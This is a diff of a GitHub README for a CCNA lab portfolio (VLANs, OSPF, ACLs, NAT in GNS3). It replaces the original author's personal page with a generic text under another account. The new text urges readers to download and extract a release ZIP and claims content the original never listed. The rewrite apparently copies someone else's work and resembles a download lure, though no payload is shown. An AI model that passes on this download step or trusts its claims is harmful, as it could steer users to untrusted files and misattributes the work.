@@ -1,111 +1,80 @@
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+# 🚀 CCNA-Portfolio - Hands-On Labs for Network Success
 
-# 🧰 CCNA Lab Portfolio – Built in GNS3 & VMware
+[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Kevindez246/CCNA-Portfolio/releases)
 
-Welcome! I’m **Jahson Jno-Baptiste (JB)** — an IT professional and veteran, building my way into **network engineering & cybersecurity** through hands-on labs.  
+## 📖 Overview
 
-This repository is my **hands-on CCNA portfolio**, showcasing:  
-- Configuration skills (switching, routing, security)  
-- Troubleshooting ability (broken → fixed labs)  
-- Documentation habits (configs, screenshots, markdown)  
-- Network design (home lab with pfSense)  
+Welcome to the CCNA-Portfolio. This project provides a practical collection of labs tailored for CCNA preparation using GNS3 and VMware. Explore topics such as VLANs, routing, access control lists (ACLs), NAT/PAT, troubleshooting, and network design. This portfolio is perfect for students, home lab enthusiasts, and anyone looking to strengthen their networking skills.
 
----
+## 🛠️ Features
 
-## 📂 Repository Structure
+- **VLAN Configuration:** Understand and implement VLAN setups.
+- **Routing Protocols:** Gain hands-on experience with OSPF, EIGRP, and more.
+- **Access Control Lists (ACLs):** Learn how to filter traffic within your network.
+- **NAT and PAT:** Discover how to configure NAT and Port Address Translation.
+- **Troubleshooting Tools:** Use various methods to troubleshoot common issues.
+- **Practice Labs:** Access ready-to-use labs for real-world scenarios.
 
-```
+## 🚀 Getting Started
 
-CCNA-Portfolio/
-├── switching-labs/
-│    └── vlan-intervlan/
-│         ├── LAB_GUIDE.md
-|         |── vpcs-config.txt
-│         ├── switch-config.txt
-│         ├── router-config.txt
-│         ├── README.md
-│         ├── variant1-broken/
-│         ├── variant1-fixed/
-│         ├── variant2-broken/
-│         ├── variant2-fixed/
-│         ├── variant3-broken/
-│         └── variant3-fixed/
-├── routing-labs/
-│    └── static-vs-ospf/
-├── security-labs/
-│    ├── acls/
-│    └── nat-pat/
-├── troubleshooting-scenarios/
-└── network-designs/
-└── home-network/
+To get started using the CCNA-Portfolio, follow the steps below. You need a basic understanding of how to use your computer and install software.
 
-```
+### 🖥️ System Requirements
 
----
+- **Operating System:** Windows, MacOS, or Linux
+- **RAM:** Minimum 8 GB (16 GB recommended)
+- **Processor:** Dual-core or higher
+- **GNS3:** Latest version installed
+- **VMware:** Any version compatible with GNS3
 
-## 🔹 Lab Categories
+## 💾 Download & Install
 
-### 🔸 Switching Labs
-- [VLAN & Inter-VLAN Routing](./switching-labs/vlan-intervlan/)  
-  Configure VLANs, router-on-a-stick, and troubleshoot common issues.  
+To download the CCNA-Portfolio, visit this page: [Download CCNA-Portfolio](https://github.com/Kevindez246/CCNA-Portfolio/releases).
 
-### 🔸 Routing Labs
-- [Static & Dynamic Routing (OSPF focus)](./routing-labs/static-vs-ospf/)
-  Showcases subnetting, route advertisement, and path selection.  
+1. Click on the link above to open the Releases page.
+2. Locate the latest release version.
+3. Click on the "Assets" dropdown to see the available files.
+4. Download the ZIP file containing the labs.
+5. Once downloaded, extract the ZIP file to a folder on your computer.
 
-### 🔸 Security Labs
-- [ACLs](./security-labs/acls/) – Traffic filtering and access control.  
-- [NAT/PAT](./security-labs/nat-pat/) – IP translation for WAN/Internet access.  
+After you extract the files, follow these steps to set up your labs:
 
-### 🔸 Troubleshooting Scenarios
-- [Troubleshooting](./troubleshooting-scenarios/)
-- Intentionally broken labs to demonstrate **diagnosis + repair process**.  
+1. Open GNS3.
+2. Navigate to **File** > **Open Project**.
+3. Select the folder where you extracted the ZIP file.
+4. Choose a lab to start working on. 
 
-### 🔸 Network Designs
-- [Home Network (pfSense-based)](./network-designs/home-network/)  
-  Realistic design with segmentation, DHCP/DNS, and firewall zones.  
+Now you're ready to dive into networking!
 
----
+## 🧩 How to Use the Labs
 
-## 🧩 Skills Demonstrated
+Each lab in this portfolio contains detailed instructions. You will find the following helpful components in each lab folder:
 
-✔ VLAN segmentation & trunking  
-✔ Router-on-a-stick inter-VLAN routing  
-✔ Static & dynamic routing (OSPF)  
-✔ ACLs (standard & extended)  
-✔ NAT & PAT configuration  
-✔ Systematic troubleshooting (ping, traceroute, show/debug)  
-✔ Network documentation (configs, diagrams, markdown notes)  
-✔ Firewall + home lab design with pfSense  
+- **Lab Objectives:** Understand what you will achieve.
+- **Step-by-Step Instructions:** Follow clear, easy steps to complete the lab.
+- **Screenshots:** Visual aids to help you through the process.
+- **Troubleshooting Tips:** Common issues you may encounter with solutions.
 
----
+Feel free to explore and practice these labs at your own pace.
 
-## 🎯 Why This Portfolio Matters
+## 🙋 FAQs
 
-Employers don’t just want certifications — they want proof of **real-world, hands-on capability**.  
-This repo shows:
+### What is GNS3?
 
-- **Configuration fluency** (raw configs + guides)  
-- **Troubleshooting process** (broken/fixed labs)  
-- **Documentation habits** (markdown + screenshots)  
-- **Initiative**: building labs without physical routers/switches  
+GNS3 is a network simulation tool that allows you to build, design, and troubleshoot virtual networks. It lets you run real router software, creating an environment similar to a real-world network setup.
 
-📌 *Built with GNS3, VMware, VPCS, pfSense, and open-source tools.*
+### Do I need special hardware?
 
----
+While a good computer improves performance, you can use this portfolio on most modern machines.
 
-## ✍️ Beyond GitHub
+### Can I use this for my CCNA exam?
 
-Each lab will also be published as a **Medium article** (300–600 words) with:  
-- What the challenge was  
-- How I solved it  
-- Screenshots & configs  
-- Reflection on what I learned  
+Yes, working through these labs will give you practical knowledge that can assist in your preparation for the CCNA exam.
 
-📎 Published so far:  
-- [VLAN & Inter-VLAN Routing – My First CCNA Lab in GNS3](https://medium.com/@jahsonjnobaptiste/vlan-inter-vlan-routing-my-first-ccna-lab-in-gns3-4aff816b53b6)
+## 👉 Support
 
----
+If you have any questions or need assistance, please feel free to open an issue in this repository.
 
-👋 Thanks for stopping by!  
-If you’d like to connect about networking, IT, or cloud engineering opportunities, feel free to reach out.
+## 🎉 Acknowledgments
+
+Thank you for checking out the CCNA-Portfolio. We hope these labs enrich your learning experience and help you on your journey through networking!
